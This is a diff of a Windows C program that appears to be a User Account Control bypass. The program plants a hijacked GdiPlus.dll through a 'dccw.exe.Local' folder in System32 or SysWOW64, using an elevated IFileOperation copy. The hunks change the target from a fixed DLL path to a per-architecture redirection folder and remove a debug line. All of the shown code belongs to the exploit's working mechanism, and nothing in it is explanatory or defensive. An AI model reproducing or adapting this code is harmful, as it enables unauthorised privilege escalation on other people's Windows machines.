@@ -411,7 +411,7 @@ BOOL IFileOperationCopy(LPCWSTR destPath) {
 	SHELLEXECUTEINFOW shexec;
 
 	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
-	//wprintf(L"%d\n", SUCCEEDED(hr));
+
 	if (SUCCEEDED(hr)) {
 		memset(&shexec, 0, sizeof(shexec));
 		memset(&bo, 0, sizeof(bo));
@@ -534,7 +534,7 @@ int wmain(int argc, wchar_t* argv[]) {
 
 		WIN32_FIND_DATA FindFileData;
 		HANDLE hFind;
-		LPCWSTR dllName = L"C:\\Windows\\System32\\dccw.exe.Local\\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.14393.953_none_baad48403594ab3f\\GdiPlus.dll";
+		LPCWSTR folderName;
 		LPCWSTR targetedDirectories = L"C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*";
 		LPCWSTR destPath;
 		GdiPlus32 gdiplus32;
@@ -542,8 +542,10 @@ int wmain(int argc, wchar_t* argv[]) {
 
 		if (wcscmp(version, L"x86") == 0) {
 			destPath = L"C:\\Windows\\System32";
+			folderName = L"C:\\Windows\\System32\\dccw.exe.Local";
 		} else if (wcscmp(version, L"x64") == 0) {
 			destPath = L"C:\\Windows\\SysWOW64";
+			folderName = L"C:\\Windows\\SysWOW64\\dccw.exe.Local";
 		} else {
 			wprintf(L" [-] Error! You must specify the target version: \"x86\" or \"x64\".\n");
 			wprintf(L" For example : \n");
@@ -578,7 +580,7 @@ int wmain(int argc, wchar_t* argv[]) {
 			return 1;
 		}
 
-		hFind = FindFirstFile(dllName, &FindFileData);
+		hFind = FindFirstFile(folderName, &FindFileData);
 		if (hFind == INVALID_HANDLE_VALUE) {
 			wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
 			removeFilesAndDirectories(targetedDirectories);
